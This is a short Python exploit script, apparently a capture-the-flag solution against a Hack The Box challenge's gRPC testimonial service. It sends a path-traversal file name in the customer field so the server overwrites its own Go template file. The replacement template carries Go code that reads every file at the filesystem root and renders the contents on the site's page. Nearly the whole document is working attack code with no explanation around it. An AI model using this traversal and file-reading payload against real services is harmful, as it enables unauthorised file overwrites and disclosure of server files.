import grpc
import ptypes_pb2_grpc as pb2_grpc
import ptypes_pb2 as pb2

payload = """
package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
        @Testimonials()
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("/")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
            </div>
        </div>
    </div>
  }
}
"""

class PtypesClient(object):
    """
    Client for gRPC functionality
    """

    def __init__(self):
        self.host = '83.136.254.221'
        self.server_port = 30285

        # instantiate a channel
        self.channel = grpc.insecure_channel(
            '{}:{}'.format(self.host, self.server_port))

        # bind the client and the server
        self.stub = pb2_grpc.RickyServiceStub(self.channel)

    def get_url(self, customer, testimonial):
        """
        Client function to call the rpc for SubmitTestimonial
        """
        message = pb2.TestimonialSubmission(customer=customer, testimonial=testimonial)
        print(f'{message}')
        return self.stub.SubmitTestimonial(message)


if __name__ == '__main__':
    client = PtypesClient()

    filename = "../../view/home/index.templ"

    result = client.get_url(customer=filename, testimonial=payload)
    print(f'{result}')